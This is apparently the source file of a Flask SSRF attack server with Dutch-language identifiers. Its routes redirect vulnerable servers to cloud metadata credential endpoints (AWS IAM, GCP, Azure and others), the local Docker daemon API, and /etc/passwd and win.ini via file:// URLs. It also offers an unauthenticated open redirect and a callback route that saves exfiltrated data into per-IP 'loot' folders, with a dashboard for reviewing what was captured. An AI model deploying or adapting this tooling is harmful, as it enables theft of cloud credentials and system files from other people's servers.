from meuk.hacksec import *  # noqa: F403
from flask import Blueprint, render_template, redirect, abort, request, jsonify
from meuk.flask.models import *  # noqa: F403
from meuk.flask.security import require_dashboard_access
from app import db
import json
import calendar
import datetime

# Blueprint Configuration
ssrf_bp = Blueprint('ssrf_bp', __name__,
                    template_folder='html',
                    static_folder='static')


def _log_ssrf(bron, doel):
    ip = request.remote_addr
    record = db_ssrf(ip=ip, doel=doel, bron=bron)
    db.session.add(record)
    db.session.commit()


# ---------- vaste redirect routes ----------

@ssrf_bp.route('/ssrf/aws', methods=['HEAD', 'GET', 'POST'])
def ssrf_aws():
    doel = 'http://169.254.169.254/latest/meta-data/iam/security-credentials'
    _log_ssrf('aws', doel)
    return redirect(doel, code=307)

@ssrf_bp.route('/ssrf/openstack', methods=['HEAD', 'GET', 'POST'])
def ssrf_openstack():
    doel = 'http://169.254.169.254/openstack'
    _log_ssrf('openstack', doel)
    return redirect(doel, code=307)

@ssrf_bp.route('/ssrf/google', methods=['HEAD', 'GET', 'POST'])
def ssrf_google():
    doel = 'http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true'
    _log_ssrf('google', doel)
    return redirect(doel, code=307)

@ssrf_bp.route('/ssrf/oracle', methods=['HEAD', 'GET', 'POST'])
def ssrf_oracle():
    doel = 'http://192.0.0.192/latest/'
    _log_ssrf('oracle', doel)
    return redirect(doel, code=307)

@ssrf_bp.route('/ssrf/digitalocean', methods=['HEAD', 'GET', 'POST'])
def ssrf_digitalocean():
    doel = 'http://169.254.169.254/metadata/v1.json'
    _log_ssrf('digitalocean', doel)
    return redirect(doel, code=307)

@ssrf_bp.route('/ssrf/kubernetes', methods=['HEAD', 'GET', 'POST'])
def ssrf_kubernetes():
    doel = 'http://192.0.0.192/latest/'
    _log_ssrf('kubernetes', doel)
    return redirect(doel, code=307)

@ssrf_bp.route('/ssrf/azure', methods=['HEAD', 'GET', 'POST'])
def ssrf_azure():
    doel = 'http://169.254.169.254/metadata/v1/maintenance'
    _log_ssrf('azure', doel)
    return redirect(doel, code=307)

@ssrf_bp.route('/ssrf/docker', methods=['HEAD', 'GET', 'POST'])
def ssrf_docker():
    doel = 'http://127.0.0.1:2375/v1.24/containers/json'
    _log_ssrf('docker', doel)
    return redirect(doel, code=307)

@ssrf_bp.route('/ssrf/passwd', methods=['HEAD', 'GET', 'POST'])
def ssrf_passwd():
    doel = 'file:////etc/passwd'
    _log_ssrf('file', doel)
    return redirect(doel, code=307)

@ssrf_bp.route('/ssrf/winini', methods=['HEAD', 'GET', 'POST'])
def ssrf_winini():
    doel = 'file:///c:/windows/win.ini'
    _log_ssrf('file', doel)
    return redirect(doel, code=307)


# ---------- nieuwe payload routes (geen auth) ----------

@ssrf_bp.route('/ssrf/redirect', methods=['HEAD', 'GET', 'POST'])
def ssrf_redirect():
    url = request.args.get('url', '')
    if not url:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")
    _log_ssrf('custom', url)
    return redirect(url, code=307)


@ssrf_bp.route('/ssrf/callback', methods=['GET', 'POST'])
def ssrf_callback():
    ip = request.remote_addr
    data = request.args.get('data') or request.args.get('d') or ''

    if request.is_json:
        body = request.get_json(silent=True)
        if body:
            data = json.dumps(body)

    if not data and request.data:
        data = request.data.decode('utf-8', errors='replace')[:50000]

    loot_dir = os.path.join('raw', 'loot', ip, 'ssrf')
    if not os.path.exists(loot_dir):
        os.makedirs(loot_dir)

    date = datetime.datetime.utcnow()
    tijdstip = calendar.timegm(date.utctimetuple())
    schrijven(f"raw/loot/{ip}/ssrf/{tijdstip}_ssrf.txt", data or f'callback from {ip}')

    record = db_ssrf(ip=ip, doel='callback', callback_data=data[:10000], bron='callback')
    db.session.add(record)
    db.session.commit()

    return '[!] Tot ziens en bedankt voor de vis.'


# ---------- dashboard routes (auth) ----------

@ssrf_bp.route('/dashboard/ssrf', methods=['GET'])
def ssrf_dashboard():
    require_dashboard_access()
    records = db_ssrf.query.order_by(db_ssrf.id.desc()).all()

    endpoints = [
        {'route': '/ssrf/aws', 'bron': 'aws', 'doel': 'AWS EC2 metadata (169.254.169.254)'},
        {'route': '/ssrf/azure', 'bron': 'azure', 'doel': 'Azure metadata'},
        {'route': '/ssrf/google', 'bron': 'google', 'doel': 'Google Cloud metadata'},
        {'route': '/ssrf/openstack', 'bron': 'openstack', 'doel': 'OpenStack metadata'},
        {'route': '/ssrf/oracle', 'bron': 'oracle', 'doel': 'Oracle Cloud metadata'},
        {'route': '/ssrf/digitalocean', 'bron': 'digitalocean', 'doel': 'DigitalOcean metadata'},
        {'route': '/ssrf/kubernetes', 'bron': 'kubernetes', 'doel': 'Kubernetes metadata'},
        {'route': '/ssrf/docker', 'bron': 'docker', 'doel': 'Docker daemon API'},
        {'route': '/ssrf/passwd', 'bron': 'file', 'doel': 'file:////etc/passwd'},
        {'route': '/ssrf/winini', 'bron': 'file', 'doel': 'file:///c:/windows/win.ini'},
        {'route': '/ssrf/redirect?url=URL', 'bron': 'custom', 'doel': 'Dynamische redirect'},
        {'route': '/ssrf/callback', 'bron': 'callback', 'doel': 'Blind SSRF bevestiging'},
    ]

    return render_template('ssrf_dashboard.html', records=records, endpoints=endpoints)


@ssrf_bp.route('/api/ssrf/data', methods=['GET'])
def api_ssrf_data():
    require_dashboard_access()
    records = db_ssrf.query.order_by(db_ssrf.id.desc()).all()
    return jsonify([{
        'id': r.id,
        'datum': r.datum.isoformat() if r.datum else None,
        'ip': r.ip,
        'doel': r.doel,
        'callback_data': r.callback_data,
        'bron': r.bron,
    } for r in records])


@ssrf_bp.route('/api/ssrf/<int:record_id>', methods=['DELETE'])
def api_ssrf_delete(record_id):
    require_dashboard_access()
    record = db.session.get(db_ssrf, record_id)
    if not record:
        return jsonify({'error': 'not found'}), 404
    db.session.delete(record)
    db.session.commit()
    return '', 204
